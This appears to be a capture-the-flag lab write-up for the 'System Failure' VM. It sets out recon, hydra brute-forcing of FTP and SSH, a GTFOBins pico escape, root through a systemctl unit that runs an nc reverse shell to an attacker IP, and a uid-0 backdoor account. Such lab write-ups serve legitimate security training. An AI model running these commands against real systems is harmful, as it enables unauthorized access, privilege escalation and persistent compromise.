@@ -1,0 +1,240 @@
+IP - 10.0.2.19
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+nmap result
+
+┌──(root㉿kali)-[~/Desktop/Junior_Pentest_Lab/system_failure]
+└─# nmap -sC -sV 10.0.2.19 -p- -oN nmap_all_port.txt
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-02 20:14 +0630
+Nmap scan report for 10.0.2.19
+Host is up (0.00010s latency).
+Not shown: 65530 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 bb02d1ee9111fea0b790e6e007499585 (RSA)
+|   256 efe604300150075d2d1799d1003df2d6 (ECDSA)
+|_  256 807fc5960e3d66b9d6a86f59faca8636 (ED25519)
+80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
+MAC Address: 08:00:27:C1:DF:7B (Oracle VirtualBox virtual NIC)
+Service Info: Host: SYSTEMFAILURE; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.9.5-Debian)
+|   Computer name: \x00
+|   NetBIOS computer name: SYSTEMFAILURE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2023-02-02T08:44:46-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time: 
+|   date: 2023-02-02T13:44:46
+|_  start_date: N/A
+|_nbstat: NetBIOS name: SYSTEMFAILURE, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.33 seconds
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Enum4linux result
+
+Found Anonymous share
+
+===================================( Share Enumeration on 10.0.2.19 )===================================
+                                                                                                                                                                                            
+                                                                                                                                                                                            
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        anonymous       Disk      open
+        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            SYSTEMFAILURE
+
+[+] Attempting to map shares on 10.0.2.19                                                                                                                                                   
+                                                                                                                                                                                            
+//10.0.2.19/print$      Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                           
+//10.0.2.19/anonymous   Mapping: OK Listing: OK Writing: N/A
+
+
+From Anonuymous share I got 'share' text file:
+
+┌──(root㉿kali)-[~/Desktop/Junior_Pentest_Lab/system_failure]
+└─# cat share                                              
+Guys, I left you access only here to give you my shared file, you have little time, I leave you the login credentials inside for FTP you will find some info, you have to hurry!
+
+89492D216D0A212F8ED54FC5AC9D340B
+
+Admin
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Decrypted NTLM hash (89492D216D0A212F8ED54FC5AC9D340B)
+
+qazwsxedc
+
+
+Bruteforce ftp with hydra:
+
+┌──(root㉿kali)-[~/Desktop/Junior_Pentest_Lab/system_failure]
+└─# hydra -L username.txt -P password.txt 10.0.2.19 ftp 
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-02 20:28:43
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:4/p:1), ~1 try per task
+[DATA] attacking ftp://10.0.2.19:21/
+[21][ftp] host: 10.0.2.19   login: admin   password: qazwsxedc
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-02 20:28:47
+
+FTP username and password:
+
+username - admin
+password - qazwsxedc
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Got 2 juicy file from ftp
+
+file0189.txt
+here.txt
+
+
+
+
+Juicy webpage
+
+I found this web dir from ftp enumeration
+
+http://10.0.2.19/area4/Sup3rS3cR37/
+
+I found two juicy file again and none of these file work for bruteforce:
+
+note.txt
+useful.txt
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+I got valex ssh password using hydra one of useful flag "-e usr" it reverse username and use as password. How I got idea to use -e usr? I tried enumeration everything and but I couldn't find anything useful and tried to read hydra -h and got an idea to use that flag.
+
+hydra -l valex -P useful.txt 10.0.2.19 ssh -e nsr
+
+[22][ssh] host: 10.0.2.19   login: valex   password: xelav
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Login into ssh with:
+
+username - valex
+password - xelav
+
+Got user.txt flag
+
+valex@SystemFailure:~$ cat user.txt 
+1871828204892bc09be79e1a02607dbf
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Switch user jin with: (Reference - https://gtfobins.github.io/gtfobins/pico/#sudo )
+
+User valex may run the following commands on SystemFailure:
+    (jin) NOPASSWD: /usr/bin/pico
+
+
+sudo -u jin /usr/bin/pico
+^R^X
+reset; sh 1>&0 2>&0
+
+$ whoami
+jin
+
+User2.txt Flag
+
+$ cat user2.txt 
+172c7b08a7507f08bab7694fd632839e
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Priv Escalation with /usr/bin/systemctl (user as jin) (Reference - https://gtfobins.github.io/gtfobins/systemctl/#suid )
+
+
+$ TF=$(mktemp).service
+$ echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.2.4 4444 >/tmp/f"
+[Install]
+WantedBy=multi-user.target' > $TF> > > > 
+$ /usr/bin/systemctl link $TF
+Created symlink /etc/systemd/system/tmp.hVOTxMynRk.service → /tmp/tmp.hVOTxMynRk.service.
+
+(Before running below command I need to listen with nc -lvnp 4444)
+
+$ /usr/bin/systemctl enable --now $TF
+Created symlink /etc/systemd/system/multi-user.target.wants/tmp.hVOTxMynRk.service → /tmp/tmp.hVOTxMynRk.service.
+
+┌──(root㉿kali)-[~]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.0.2.4] from (UNKNOWN) [10.0.2.19] 42248
+sh: 0: can't access tty; job control turned off
+# whoami
+root
+
+Boom! I got root
+
+Root flag
+
+# cat .SuP3rFin4Lfl4g.txt
+
+╔═╗┬ ┬┌─┐┌┬┐┌─┐┌┬┐  ╔═╗┌─┐┬┬  ┬ ┬┬─┐┌─┐
+╚═╗└┬┘└─┐ │ ├┤ │││  ╠╣ ├─┤││  │ │├┬┘├┤ 
+╚═╝ ┴ └─┘ ┴ └─┘┴ ┴  ╚  ┴ ┴┴┴─┘└─┘┴└─└─┘
+
+I knew you would succeed.
+
+Oh no.
+
+2527f167fe33658f6b976f3a4ac988dd
+
+Follow me and give feedback on Twitter: 0xJin
+
+L1N5c3QzbUY0aUx1UjIzNTEyNA==
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Add new user as root 
+
+root@vulnix:~# useradd -ou 0 -g 0 lol
+root@vulnix:~# passwd lol
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+
+user - lol
+password - test1234
